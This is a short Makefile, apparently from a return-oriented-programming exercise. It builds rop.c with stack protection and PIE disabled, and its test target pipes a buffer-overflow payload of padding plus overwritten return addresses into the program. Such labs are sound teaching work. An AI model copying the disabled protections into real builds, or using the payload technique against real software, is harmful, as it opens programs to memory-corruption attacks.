CC = gcc

all: rop

rop: rop.c
	gcc rop.c -o rop -fno-stack-protector -no-pie

clean:
	rm rop

test:
	printf "aaaabbbbccccddddeeeeffff\x3a\x11\x40\x00\x00\x00\x00\x00zzzzzzzz\x4d\x11\x40\x00\x00\x00\x00\x00" | ./rop

.PHONY: all clean test
